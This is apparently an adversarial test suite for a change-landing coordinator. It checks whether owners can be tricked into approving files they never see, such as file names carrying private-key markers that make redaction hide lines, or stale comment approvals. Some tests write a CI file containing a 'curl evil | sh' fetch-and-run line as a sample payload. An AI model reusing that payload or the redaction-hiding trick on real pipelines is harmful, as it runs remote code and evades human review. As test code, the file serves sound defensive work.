// Since the owner's decision of 2026-11-09 a reply answers a decision only by naming its id: tests that answered with a
// bare reply name the id now, and tests of bare-reply behaviour expect no answer and one reply_without_id note.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { FileBacklog } from '../src/backlog/file.js';
import { loadConfig } from '../src/config/load.js';
import { ReviewConfig } from '../src/config/schema.js';
import { Coordinator } from '../src/coordinator.js';
import { questionLines } from '../src/coordinator/landing.js';
import { EventLog } from '../src/events/log.js';
import { redactString, TRACKER } from '../src/events/redact.js';
import type { EventPayload } from '../src/events/types.js';
import { stopFilePath } from '../src/auto-merge-stop.js';
import { stopAll } from '../src/slots.js';
import { DEFAULT_COMMIT_IDENTITY, FakeRunner, type RunRequest } from '../src/runner.js';
import { which } from '../src/os/index.js';
import { repoRoot } from './helpers.js';

// R1182v (adversarial) on #1182. V1: a name the tracker's redaction would change is shown by its bytes, and the question
// is redacted line by line (V1f), so no redaction hides a bound file. V2: the stops hold after a floor approval. V3: a
// landing-approved batch is built exactly again, with no other entry. V4: a comment answers only a question asked
// before it. Ported from the review's TypeScript (attacks-1182v), assertions unchanged except V3's controls (below);
// V1f and V3b are added.

const skip = !which('gitleaks') && 'gitleaks not installed';
const git = (cwd: string, ...a: string[]) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const PRINT = 'landing floor, exactly this batch and these files: sha256 ';
const REVIEW = (wait: string[] = []) =>
  ReviewConfig.parse({ version: 1, levels: { L0_auto: { when: ['app-non-money'], max_lines: 100000 }, L1_evaluator: { when: [] }, L2_notify: { when: [] }, L3_human: { when: [] } }, merge: { wait_categories: wait } });

function fixture() {
  const base = mkdtempSync(join(tmpdir(), 'r1182v-'));
  const remote = join(base, 'remote.git');
  const seed = join(base, 'seed');
  cpSync(join(repoRoot, 'examples', 'basic'), seed, { recursive: true });
  writeFileSync(join(seed, '.gitignore'), '.claude/worktrees/\n');
  git(base, 'init', '-q', '--bare', '-b', 'main', remote);
  git(seed, 'init', '-q', '-b', 'main');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', 'add', '-A');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'init');
  git(seed, 'remote', 'add', 'origin', remote);
  git(seed, 'push', '-q', 'origin', 'main');
  const repo = join(base, 'clone');
  git(base, 'clone', '-q', remote, repo);
  for (const [k, v] of [['user.email', 'coordinator@example.com'], ['user.name', 'coordinator'], ['commit.gpgsign', 'false'], ['core.precomposeunicode', 'false']]) git(repo, 'config', k!, v!);
  const cfg = loadConfig(repo);
  cfg.project.land_mode = 'direct';
  cfg.tests.runner.changed = 'node --test --test-reporter=spec';
  cfg.review = REVIEW();
  const slotsDir = join(base, 'slots');
  mkdirSync(slotsDir);
  writeFileSync(join(slotsDir, 'config.json'), JSON.stringify({ max_agents: 2 }));
  const stateDir = join(base, 'state');
  mkdirSync(stateDir, { recursive: true });
  return { base, remote, repo, cfg, backlog: new FileBacklog(join(base, 'backlog.json'), 'coordinator'), log: new EventLog(join(base, 'events.db')), slotsDir, stateDir };
}
type Fixture = ReturnType<typeof fixture>;
type Queued = EventPayload<'land.queued'>;
type Floor = { held: string[]; ask: unknown[]; seen: boolean; listed: string[]; print: string };
const ISSUE = 'Totals count non-positive quantities.\n\n```done_when\n- test: test/price.test.js\n```\n';
const runner = (extra: Record<string, string>) =>
  new FakeRunner((req: RunRequest) => {
    if (req.role === 'worker') {
      const p = join(req.cwd, 'src', 'price.js');
      writeFileSync(p, readFileSync(p, 'utf8').replace('sum + cents * qty', 'sum + (qty > 0 ? cents * qty : 0)'));
      for (const [f, body] of Object.entries(extra)) {
        mkdirSync(dirname(join(req.cwd, f)), { recursive: true });
        writeFileSync(join(req.cwd, f), body);
      }
      git(req.cwd, 'add', '-A');
      git(req.cwd, '-c', `user.email=${DEFAULT_COMMIT_IDENTITY.email}`, '-c', `user.name=${DEFAULT_COMMIT_IDENTITY.name}`, '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'fix');
      return { structured: { summary: 'fixed' } };
    }
    return { structured: { patch_correct: true, test_correct: true, confidence: 'high', advice: 'looks right', claims: [{ claim: 'read the diff in full', label: 'measured', basis: 'git diff' }], files_reviewed: ['src/price.js', ...Object.keys(extra)], design_change: false } };
  });
const coord = (f: Fixture, extra: Record<string, string> = {}, o: { autoMerge?: () => boolean } = {}) =>
  new Coordinator({ cfg: f.cfg, log: f.log, backlog: f.backlog, runner: runner(extra), repo: f.repo, instance: 'alice', stateDir: f.stateDir, slotsDir: f.slotsDir, maxAttempts: 1, machine: { load: () => 1, disk: () => ({ freePct: 80, totalGb: 500 }) }, ...(o.autoMerge ? { autoMerge: o.autoMerge } : {}) });
async function cycle(f: Fixture, extra: Record<string, string> = {}, o: { autoMerge?: () => boolean } = {}) {
  const c = coord(f, extra, o);
  await c.tick();
  await c.idle();
}
const landFloor = (f: Fixture, tip: string, head: string, applied: Queued[]) => (coord(f) as unknown as { landFloor(p: string, t: string, h: string, a: Queued[]): Floor }).landFloor(f.repo, tip, head, applied);
const onMain = (f: Fixture) => git(f.base, '--git-dir', f.remote, 'ls-tree', '-r', '--name-only', 'main').split('\n');
const mainSha = (f: Fixture) => git(f.base, '--git-dir', f.remote, 'rev-parse', 'main');
const asked = (f: Fixture) => f.log.read(0, ['decision.asked']).map((e) => e.payload as EventPayload<'decision.asked'>).filter((q) => q.kind === 'land');

let n = 0;
function levelAndApprove(f: Fixture, o: { issue: number; head: string; level: 'L1' | 'L3'; reasons?: string[]; approved?: boolean }) {
  f.log.append('review.level_set', { issue: o.issue, head: o.head, level: o.level, reasons: o.reasons ?? [] }, 'coordinator');
  if (o.approved) {
    const id = `r${o.issue}-${n++}`;
    f.log.append('decision.asked', { id, kind: 'land', issue: o.issue, owner: 'example-owner', question: 'Approve?', options: ['approve', 'reject'], recommendation: 'reject', receipts: [] }, 'coordinator');
    f.log.append('decision.answered', { id, by: 'example-owner', answer: 'approve' }, 'example-owner', 'human');
  }
}
function event(f: Fixture, o: { issue: number; head: string; base: string; files: string[]; level: 'L1' | 'L3'; approved?: boolean }): Queued {
  f.log.append('change.proposed', { issue: o.issue, branch: `b${o.issue}`, base: o.base, head: o.head, files: o.files, lines: 1, patch_hash: 'x' }, 'coordinator');
  levelAndApprove(f, o);
  const q = { issue: o.issue, head: o.head, level: o.level } as Queued;
  f.log.append('land.queued', q, 'coordinator');
  return q;
}
/** What decisions.ts does on an approve to a landing question: the level (with the print) stays, the entry is queued at L3. */
const approveAtLanding = (f: Fixture, qs: Queued[], fl: Floor): Queued[] => {
  const reasons = [...fl.held.map((r) => `${r}: held`), ...fl.listed, `${PRINT}${fl.print}`];
  return qs.map((q) => {
    levelAndApprove(f, { issue: q.issue, head: q.head, level: 'L3', reasons, approved: true });
    const p = { issue: q.issue, head: q.head, level: 'L3' } as Queued;
    f.log.append('land.queued', p, 'coordinator');
    return p;
  });
};
const put = (r: string, p: string, body: string) => {
  mkdirSync(dirname(join(r, p)), { recursive: true });
  writeFileSync(join(r, p), body);
};
const commitIn = (r: string) => (m: string) => {
  git(r, 'add', '-A');
  git(r, 'commit', '-q', '--allow-empty', '-m', m);
  return git(r, 'rev-parse', 'HEAD');
};
function withApproved(f: Fixture) {
  const r = f.repo;
  const tip = git(r, 'rev-parse', 'HEAD');
  const commit = commitIn(r);
  writeFileSync(join(r, 'src', 'ok.js'), 'export const ok = 1;\n');
  const a = commit('A');
  const qa = event(f, { issue: 1, head: a, base: tip, files: ['src/ok.js'], level: 'L3', approved: true });
  const output = (write: () => void, m = 'pre-land') => {
    git(r, 'checkout', '-q', '-f', a);
    write();
    return commit(m);
  };
  return { tip, qa, output };
}
const CI = 'test: { script: [echo ok] }\n';
/** The comment as ask() (src/coordinator/base.ts) builds it, then as every backlog (file.ts, github.ts) posts it: redactString(body, TRACKER). */
const posted = (fl: Floor) => {
  const receipts = ['head 00000000', ...questionLines(fl.held.map((r) => `${r}: held`), fl.listed, 'review.level_set event 1'), `${PRINT}${fl.print}`];
  const body = `[wl] @example-owner decision needed: **Approve landing #1 (L3)?**\n\nOptions: approve / reject. Recommendation: **reject**.\n\n${receipts.map((r) => `- ${r}`).join('\n')}\n\nReply \`/wl approve\` or \`/wl reject\` (owner or a writer), or run \`wl decide d-1 <option>\`.`;
  return redactString(body, TRACKER);
};

// ---- V1: the tracker's redaction of the whole comment hides bound files between two key-marker names ----
const CIRCLE = ['a', 'b', 'c', 'd'].map((x) => `.circleci/${x}.yml`);
const BEGIN = '.circleci/c1 -----BEGIN PRIVATE KEY-----';
const END = '.circleci/e -----END PRIVATE KEY-----';

test('V1 control: four ci files: the posted comment (after the tracker redaction) shows .circleci/d.yml', () => {
  const f = fixture();
  const { tip, qa, output } = withApproved(f);
  const h = output(() => CIRCLE.forEach((p) => put(f.repo, p, CI)));
  const fl = landFloor(f, tip, h, [qa]);
  assert.equal(fl.ask.length, 1, 'control: held and asked');
  assert.ok(posted(fl).includes('.circleci/d.yml'), 'control: shown');
});

test('V1 (unit): names holding a private key BEGIN and END line make the posted comment drop .circleci/d.yml, which the approval binds', () => {
  const f = fixture();
  const { tip, qa, output } = withApproved(f);
  const h1 = output(() => [...CIRCLE, BEGIN, END].forEach((p) => put(f.repo, p, CI)));
  const fl1 = landFloor(f, tip, h1, [qa]);
  assert.equal(fl1.ask.length, 1, 'control: held and asked');
  assert.ok(fl1.listed.some((l) => l.includes('.circleci/d.yml')), 'control: d.yml is in the listed lines (shownPath leaves the marker names as they are)');
  approveAtLanding(f, [qa], fl1);
  assert.equal(landFloor(f, tip, h1, [qa]).ask.length, 0, 'control: the approval covers the identical land commit');
  const h2 = output(() => [...CIRCLE, BEGIN, END].forEach((p) => put(f.repo, p, p === '.circleci/d.yml' ? 'evil: 1\n' : CI)));
  assert.equal(landFloor(f, tip, h2, [qa]).ask.length, 1, 'control: d.yml is bound (a rewrite asks again)');
  const shown = posted(fl1);
  assert.ok(shown.includes('.circleci/d.yml'), `HIDDEN: .circleci/d.yml is bound but not in the comment the owner sees:\n${shown}`);
});

test('V1b (unit): one BEGIN name alone drops every line after it, the print and the reply instructions included', () => {
  const f = fixture();
  const { tip, qa, output } = withApproved(f);
  const h = output(() => [...CIRCLE, BEGIN].forEach((p) => put(f.repo, p, CI)));
  const fl = landFloor(f, tip, h, [qa]);
  const shown = posted(fl);
  assert.ok(shown.includes('.circleci/d.yml') && shown.includes(PRINT), `HIDDEN: the tail of the question is gone:\n${shown}`);
});

test('V1e (end to end): a pre-land step writes the ci files and the two marker names; one approve of a comment that never shows .circleci/d.yml, and it lands', { skip }, async () => {
  const f = fixture();
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  const gen = `import { mkdirSync, writeFileSync } from 'node:fs';
mkdirSync('.circleci', { recursive: true });
for (const p of ${JSON.stringify([...CIRCLE, BEGIN, END])}) writeFileSync(p, ${JSON.stringify(CI)});
`;
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, { 'tools/gen.mjs': gen });
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.equal(asked(f).length, 1, 'control: asked once at landing');
  const body = (await f.backlog.comments(1)).map((c) => c.body).filter((b) => b.includes('decision needed')).at(-1)!;
  const level = f.log.read(0, ['review.level_set']).map((e) => e.payload as EventPayload<'review.level_set'>).at(-1)!;
  assert.ok(level.reasons.some((r) => r.includes('.circleci/d.yml')), 'control: the level (event log) names d.yml');
  const shown = body.includes('.circleci/d.yml');
  const q = asked(f).at(-1)!;
  f.log.append('decision.answered', { id: q.id, by: 'example-owner', answer: 'approve' }, 'example-owner', 'human');
  for (let i = 0; i < 2; i++) await cycle(f);
  const landed = onMain(f).includes('.circleci/d.yml');
  assert.ok(landed || !shown, 'control: when shown it lands (or nothing to compare)');
  assert.ok(shown || !landed, `HIDDEN AND LANDED: .circleci/d.yml is on main after ${asked(f).length} approve(s) of a comment that never names it:\n${body}`);
});

// ---- V2: the auto-merge stop and the emergency stop after the floor's approval (held) ----
async function floorApproved(f: Fixture, o: { autoMerge?: () => boolean } = {}) {
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  const gen = `import { writeFileSync } from 'node:fs';\nwriteFileSync('.gitlab-ci.yml', ${JSON.stringify(CI)});\n`;
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, { 'tools/gen.mjs': gen }, o);
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f, {}, o);
  assert.equal(asked(f).length, 1, 'control: the floor asked');
  const q = asked(f).at(-1)!;
  f.log.append('decision.answered', { id: q.id, by: 'example-owner', answer: 'approve' }, 'example-owner', 'human');
}

test('V2 control: the floor asks, the owner approves, it lands', { skip }, async () => {
  const f = fixture();
  await floorApproved(f, { autoMerge: () => true });
  for (let i = 0; i < 2; i++) await cycle(f, {}, { autoMerge: () => true });
  assert.ok(onMain(f).includes('.gitlab-ci.yml'), 'control: landed');
});

test('V2a: the auto-merge stop set after the floor approval holds the land; cleared, it lands', { skip }, async () => {
  const f = fixture();
  await floorApproved(f, { autoMerge: () => true });
  const before = mainSha(f);
  writeFileSync(stopFilePath(f.stateDir), JSON.stringify({ reason: 'stopped by the owner' }));
  for (let i = 0; i < 2; i++) await cycle(f, {}, { autoMerge: () => true });
  assert.equal(mainSha(f), before, 'held while stopped');
  rmSync(stopFilePath(f.stateDir));
  for (let i = 0; i < 2; i++) await cycle(f, {}, { autoMerge: () => true });
  assert.ok(onMain(f).includes('.gitlab-ci.yml'), 'control: lands once cleared, with no second question');
  assert.equal(asked(f).length, 1, 'one question');
});

test('V2b: an emergency stop after the floor approval holds the land', { skip }, async () => {
  const f = fixture();
  await floorApproved(f, { autoMerge: () => true });
  const before = mainSha(f);
  stopAll('example-owner', 'stop everything', f.slotsDir);
  for (let i = 0; i < 2; i++) await cycle(f, {}, { autoMerge: () => true });
  assert.equal(mainSha(f), before, 'held under the emergency stop');
});

test("V2c: the policy's auto_merge off: an unapproved (L1) direct land never reaches the floor or main; the floor-approved (L3) one lands (the owner's (c))", { skip }, async () => {
  const off = fixture();
  off.cfg.tests.land.pre = ['node tools/gen.mjs'];
  off.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  const before = mainSha(off);
  for (let i = 0; i < 3; i++) await cycle(off, { 'tools/gen.mjs': `import { writeFileSync } from 'node:fs';\nwriteFileSync('.gitlab-ci.yml', ${JSON.stringify(CI)});\n` }, { autoMerge: () => false });
  assert.equal(asked(off).length, 0, 'no floor question for an entry the switch keeps queued');
  assert.equal(mainSha(off), before, 'main untouched');
  const f = fixture();
  let auto = true;
  await floorApproved(f, { autoMerge: () => auto });
  auto = false;
  for (let i = 0; i < 2; i++) await cycle(f, {}, { autoMerge: () => auto });
  assert.ok(onMain(f).includes('.gitlab-ci.yml'), 'the owner-approved land still lands with the switch off (by design)');
});

// ---- V3: a later L1 entry joins a batch of landing-approved entries: it is asked about a batch that is never built ----
test('V3: an honest L1 entry queued beside a landing-approved batch is approved for {1,2,3}, never built, and asked again alone', () => {
  const f = fixture();
  f.cfg.tests.land.batch_max = 4;
  const r = f.repo;
  const tip = git(r, 'rev-parse', 'HEAD');
  const commit = commitIn(r);
  const heads: string[] = [];
  for (const k of [1, 2, 3]) {
    git(r, 'checkout', '-q', '-f', tip);
    writeFileSync(join(r, 'src', `ok${k}.js`), `export const ok${k} = 1;\n`);
    heads.push(commit(`E${k}`));
  }
  const [q1, q2] = [1, 2].map((k) => event(f, { issue: k, head: heads[k - 1]!, base: tip, files: [`src/ok${k}.js`], level: 'L1' }));
  const c = coord(f) as unknown as { buildBatch(q: Queued[]): Queued[] };
  const land = (qs: Queued[]) => {
    git(r, 'checkout', '-q', '-f', tip);
    for (const q of qs) git(r, 'cherry-pick', q.head);
    put(r, '.gitlab-ci.yml', CI); // the pre-land step's output, the same every land
    return commit(`pre-land ${qs.map((q) => q.issue).join(',')}`);
  };
  const fl12 = landFloor(f, tip, land([q1!, q2!]), [q1!, q2!]);
  assert.equal(fl12.ask.length, 2, 'control: {1,2} asked');
  const [a1, a2] = approveAtLanding(f, [q1!, q2!], fl12);
  // #3 is queued (L1) before the next pass.
  const q3 = event(f, { issue: 3, head: heads[2]!, base: tip, files: ['src/ok3.js'], level: 'L1' });
  // Changed from the review's controls (which recorded #3 joining {1,2} and being asked about {1,2,3}): a batch seeded by
  // a landing-approved entry holds only the entries with its print, so #3 waits for its own batch.
  const next = c.buildBatch([a1!, a2!, q3]);
  assert.deepEqual(next.map((q) => q.issue), [1, 2], '#3 does not join the landing-approved pair');
  assert.equal(landFloor(f, tip, land(next), next).ask.length, 0, '{1,2} lands on its approvals');
  // Then #3 alone, asked once about the batch that is built, and covered by that one approval.
  const own = c.buildBatch([q3]);
  const fl3 = landFloor(f, tip, land(own), own);
  assert.deepEqual((fl3.ask as Queued[]).map((q) => q.issue), [3], '#3 asked once, about {3}');
  const [a3] = approveAtLanding(f, [q3], fl3);
  const last = c.buildBatch([a3!]);
  const again = landFloor(f, tip, land(last), last);
  assert.equal(again.ask.length, 0, `ASKED TWICE: #3 was approved for batch {1,2,3}, which is never built; alone it is asked again (${asked(f).length} recorded questions are simulated here; count the approvals: 1,2,3 then 3 again)`);
});

test('V3b (not the review\'s): an L1 entry queued first never takes a landing-approved entry into its batch', () => {
  const f = fixture();
  f.cfg.tests.land.batch_max = 4;
  const r = f.repo;
  const tip = git(r, 'rev-parse', 'HEAD');
  const commit = commitIn(r);
  const heads: string[] = [];
  for (const k of [1, 2]) {
    git(r, 'checkout', '-q', '-f', tip);
    writeFileSync(join(r, 'src', `ok${k}.js`), `export const ok${k} = 1;\n`);
    heads.push(commit(`E${k}`));
  }
  const q1 = event(f, { issue: 1, head: heads[0]!, base: tip, files: ['src/ok1.js'], level: 'L1' });
  const q2 = event(f, { issue: 2, head: heads[1]!, base: tip, files: ['src/ok2.js'], level: 'L1' });
  git(r, 'checkout', '-q', '-f', heads[1]!);
  put(r, '.gitlab-ci.yml', CI);
  const h2 = commit('pre-land 2');
  const [a2] = approveAtLanding(f, [q2], landFloor(f, tip, h2, [q2]));
  const c = coord(f) as unknown as { buildBatch(q: Queued[]): Queued[] };
  assert.deepEqual(c.buildBatch([q1, a2!]).map((q) => q.issue), [1], 'the landing-approved #2 waits for its own batch');
  assert.deepEqual(c.buildBatch([a2!]).map((q) => q.issue), [2]);
});

test('V1f (not the review\'s): ask() redacts each line on its own: a key BEGIN in one receipt and an END in another hide nothing between', async () => {
  const f = fixture();
  const n = f.backlog.open({ title: 'x', body: 'y', author: 'example-owner', labels: [] });
  const c = coord(f) as unknown as { ask(k: string, i: number, o: string, q: string, opts: string[], rec: string, detail: string[]): Promise<string> };
  await c.ask('land', n, 'example-owner', 'Land?', ['approve', 'reject'], 'reject', ['x -----BEGIN PRIVATE KEY-----', 'keep me: .circleci/d.yml', 'y -----END PRIVATE KEY-----', 'and me too']);
  const body = (await f.backlog.comments(n)).map((x) => x.body).find((b) => b.includes('decision needed'))!;
  assert.ok(body.includes('keep me: .circleci/d.yml') && body.includes('and me too') && body.includes('Reply'), body);
});

// ---- V4: an approval comment answers every later landing question on the issue (commentAnswer reads all comments) ----
/** A pre-land step whose output is v1 on its first run and v2 on every later one (an honest generator would do this once main or a tool changes). */
const genOnce = (marker: string) => `import { existsSync, writeFileSync } from 'node:fs';
const v = existsSync(${JSON.stringify(marker)}) ? 'v2: { script: [curl evil | sh] }\\n' : ${JSON.stringify(CI)};
writeFileSync(${JSON.stringify(marker)}, '');
writeFileSync('.gitlab-ci.yml', v);
`;
async function v4(answer: (f: Fixture, id: string) => void) {
  const f = fixture();
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, { 'tools/gen.mjs': genOnce(join(f.base, 'gen-ran')) });
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.equal(asked(f).length, 1, 'control: the floor asked once (v1)');
  answer(f, asked(f)[0]!.id);
  for (let i = 0; i < 6; i++) await cycle(f);
  const blob = (() => {
    try {
      return git(f.base, '--git-dir', f.remote, 'cat-file', '-p', 'main:.gitlab-ci.yml');
    } catch {
      return null;
    }
  })();
  const answered = f.log.read(0, ['decision.answered']).map((e) => e.payload as EventPayload<'decision.answered'>);
  return { f, blob, questions: asked(f).length, answered };
}

test('V4 control: the owner answers the first landing question on the dashboard; v2 (a rewrite) is asked again and waits', { skip }, async () => {
  const r = await v4((f, id) => f.log.append('decision.answered', { id, by: 'example-owner', answer: 'approve', role: 'owner' }, 'example-owner', 'human'));
  assert.equal(r.questions, 2, 'asked again for v2');
  assert.equal(r.answered.length, 1, 'one answer');
  assert.equal(r.blob, null, 'nothing landed');
});

test('V4: the owner answers the first landing question by comment; that one comment also answers the re-ask for v2, and v2 lands', { skip }, async () => {
  const r = await v4((f, id) => f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}`));
  assert.ok(r.questions >= 2, `control: asked again for v2 (${r.questions} questions)`);
  assert.ok(r.blob === null || !r.blob.includes('evil'), `STALE APPROVAL: one owner comment answered ${r.answered.length} landing questions (${JSON.stringify(r.answered.map((a) => a.by))}); main now has .gitlab-ci.yml = ${JSON.stringify(r.blob)}`);
});

test('V4b: an L3 change the owner approved at review by comment; the landing floor\'s first question is answered by that same review-time comment, and the output lands unasked', { skip }, async () => {
  const f = fixture();
  f.cfg.review = ReviewConfig.parse({ version: 1, levels: { L0_auto: { when: [] }, L1_evaluator: { when: [] }, L2_notify: { when: [] }, L3_human: { when: ['app-non-money'] } } });
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, { 'tools/gen.mjs': `import { writeFileSync } from 'node:fs';\nwriteFileSync('.gitlab-ci.yml', 'deploy: { script: [curl evil | sh] }\\n');\n` });
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.equal(asked(f).length, 1, 'control: asked at review (L3)');
  assert.ok(!(f.log.read(0, ['review.level_set']).map((e) => e.payload as EventPayload<'review.level_set'>).at(-1)!.reasons.some((r) => r.startsWith(PRINT))), 'control: a review-time question, no landing print');
  f.backlog.humanComment(1, 'example-owner', `looks right\n/worklane approve ${asked(f)[0]!.id}`);
  for (let i = 0; i < 6; i++) await cycle(f);
  const q = asked(f);
  const answered = f.log.read(0, ['decision.answered']).map((e) => e.payload as EventPayload<'decision.answered'>);
  assert.ok(q.length >= 2, `control: the landing floor asked about .gitlab-ci.yml (${q.length} questions)`);
  assert.ok(!onMain(f).includes('.gitlab-ci.yml'), `UNASKED LAND: the floor's question was answered by the review-time comment (${answered.length} answers from 1 comment); .gitlab-ci.yml is on main`);
});

test('V1g (not the review\'s): two names the tracker would redact the same way (emails) are listed by their bytes, distinct, and pass the tracker unchanged', () => {
  const f = fixture();
  const { tip, qa, output } = withApproved(f);
  const h = output(() => [...CIRCLE, 'docs/a@example.io', 'docs/b@example.org'].forEach((p) => put(f.repo, p, CI)));
  const fl = landFloor(f, tip, h, [qa]);
  const odd = fl.listed.filter((l) => l.includes('a name the tracker would redact'));
  assert.equal(odd.length, 2, JSON.stringify(fl.listed));
  assert.notEqual(odd[0], odd[1]);
  for (const l of odd) assert.equal(redactString(l, TRACKER), l, 'the bytes form passes the tracker unchanged');
  assert.ok(odd.some((l) => l.includes(Buffer.from('docs/a@example.io').toString('hex'))));
});
